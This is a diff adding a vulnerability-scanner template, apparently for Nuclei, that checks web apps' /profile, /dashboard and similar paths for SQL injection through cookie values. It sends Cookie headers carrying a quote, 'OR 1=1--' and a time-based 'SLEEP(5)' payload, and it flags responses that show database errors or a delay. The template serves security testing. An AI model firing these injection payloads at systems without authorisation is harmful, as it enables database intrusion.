@@ -1,0 +1,63 @@
+id: sqli-cookie-based
+
+info:
+  name: SQL Injection via Cookie Values
+  author: security-researcher
+  severity: high
+  description: |
+    쿠키 값을 통한 SQL 인젝션 취약점을 탐지합니다.
+    세션 ID, 사용자 ID 등을 쿠키로 관리하는 경우 취약할 수 있습니다.
+  tags: sqli,cookie,injection,session
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/profile"
+      - "{{BaseURL}}/dashboard"
+      - "{{BaseURL}}/account"
+      - "{{BaseURL}}/user/info"
+
+    headers:
+      Cookie: "user_id=1'"
+
+    matchers-condition: or
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "you have an error in your sql syntax"
+          - "ORA-\\d{5}"
+          - "Microsoft OLE DB"
+          - "PostgreSQL.*ERROR"
+          - "warning: mysql"
+        condition: or
+        case-insensitive: true
+
+  - method: GET
+    path:
+      - "{{BaseURL}}/profile"
+      - "{{BaseURL}}/dashboard"
+
+    headers:
+      Cookie: "user_id=1 OR 1=1--"
+
+    matchers-condition: or
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "sql.*error|syntax.*error|database.*error"
+        condition: or
+        case-insensitive: true
+
+  - method: GET
+    path:
+      - "{{BaseURL}}/profile"
+
+    headers:
+      Cookie: "session=1' AND SLEEP(5)--"
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "duration >= 5000"
